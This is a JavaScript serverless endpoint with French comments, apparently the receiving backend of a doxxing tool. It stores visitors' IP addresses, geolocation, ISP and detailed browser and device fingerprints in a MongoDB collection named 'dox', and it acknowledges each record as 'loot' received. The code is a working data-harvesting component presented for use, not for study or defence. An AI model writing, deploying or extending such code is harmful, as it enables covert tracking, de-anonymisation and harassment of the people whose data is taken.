
import { MongoClient } from 'mongodb';

const MONGODB_URI = process.env.MONGODB_URI;
const MONGODB_DB = process.env.MONGODB_DB || 'dox_treasure';
const MONGODB_COLLECTION = 'dox';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Vérifier que la variable d'environnement MongoDB est configurée
  if (!MONGODB_URI) {
    console.error('Missing MONGODB_URI');
    return res.status(500).json({ error: 'Database configuration missing on server. Please set MONGODB_URI.' });
  }

  try {
    const client = new MongoClient(MONGODB_URI);
    await client.connect();
    
    const db = client.db(MONGODB_DB);
    const collection = db.collection(MONGODB_COLLECTION);

    const data = req.body;

    const doxEntry = {
      timestamp: new Date().toISOString(),
      user_agent: data.userAgent,
      device: data.device,
      platform: data.platform,
      hardware_concurrency: data.hardwareConcurrency,
      device_memory: data.deviceMemory,
      language: data.language,
      languages: data.languages,
      screen: data.screen,
      timezone: data.timezone,
      cookies_enabled: data.cookiesEnabled,
      online: data.online,
      do_not_track: data.doNotTrack,
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country,
      org: data.org,
      raw_data: data,
      created_at: new Date()
    };

    console.log("🪔 NOUVEAU DOX REÇU");
    console.log(JSON.stringify(doxEntry, null, 2));

    // Sauvegarde dans MongoDB
    const result = await collection.insertOne(doxEntry);

    console.log("✅ Données sauvegardées dans MongoDB", result.insertedId);
    
    await client.close();
    
    return res.status(200).json({ 
      status: "success", 
      message: "Butin bien reçu et stocké !",
      id: result.insertedId
    });

  } catch (error) {
    console.error("❌ Erreur MongoDB:", error);
    return res.status(500).json({ error: "Erreur sauvegarde BD" });
  }
}